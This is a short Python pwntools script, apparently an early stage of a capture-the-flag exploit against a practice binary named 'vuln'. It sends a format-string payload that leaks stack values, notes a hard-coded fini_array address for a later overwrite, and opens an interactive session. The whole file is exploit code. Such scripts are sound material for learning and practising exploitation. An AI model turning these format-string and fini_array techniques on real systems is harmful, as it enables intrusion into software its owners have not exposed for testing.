import pwn
exe = pwn.context.binary = pwn.ELF('./vuln')
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    io = pwn.gdb.debug(exe.path, gdbscript='b *0x000000000040218e\nc\n')
elif pwn.args.REMOTE:
    io = pwn.remote()
else:
    io = exe.process()
fini_array = 0x00000000004f9c30
pwn.log.info("FINI_ARRAY: "+hex(fini_array))
payload = b'%7$p.'
payload += b'%8$p'
payload += (40 - len(payload))*b'A'
io.sendlineafter(b"&\n", b"B")
io.sendlineafter(b"->", payload)
io.interactive()
